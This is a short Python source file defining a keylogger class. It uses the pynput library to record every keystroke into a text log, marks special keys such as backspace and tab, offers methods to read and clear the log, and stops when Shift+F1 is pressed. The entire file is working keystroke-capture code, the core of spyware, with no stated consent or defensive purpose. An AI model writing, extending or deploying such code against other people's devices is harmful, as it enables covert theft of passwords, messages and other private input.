import pynput.keyboard
import pynput.mouse
import threading

KEY = pynput.keyboard.Key


class Keylogger:
    def __init__(self, escape_combo=(KEY.shift, KEY.f1)):
        self.key_log = ""
        self.keylogger_running = False
        self.key_combo = []
        self.escape_combo = list(escape_combo)
        self.key_listener = pynput.keyboard.Listener(on_press=self.on_keyboard_event)

    def start(self):
        self.key_listener.start()
        self.keylogger_running = True

    def get_key_log(self):
        return self.key_log

    def clear_key_log(self):
        self.key_log = ""

    def stop_key_logger(self):
        self.key_listener.stop()
        self.keylogger_running = False
        threading.Thread.__init__(self.key_listener)

    def on_keyboard_event(self, event):
        if event == KEY.backspace:
            self.key_log += " [Bck] "
        elif event == KEY.tab:
            self.key_log += " [Tab] "
        elif event == KEY.enter:
            self.key_log += "\n"
        elif event == KEY.space:
            self.key_log += " "
        elif type(event) == KEY:  # if the character is some other type of special key
            self.key_log += " [" + str(event)[4:] + "] "
        else:
            self.key_log += str(event)[1:len(str(event)) - 1]  # remove quotes around

        self.check_escape_char(event)

    def check_escape_char(self, key):
        self.key_combo.append(key)
        if key != self.escape_combo[len(self.key_combo) - 1]:
            self.key_combo = []
        else:
            if self.key_combo == self.escape_combo:
                self.stop_key_logger()
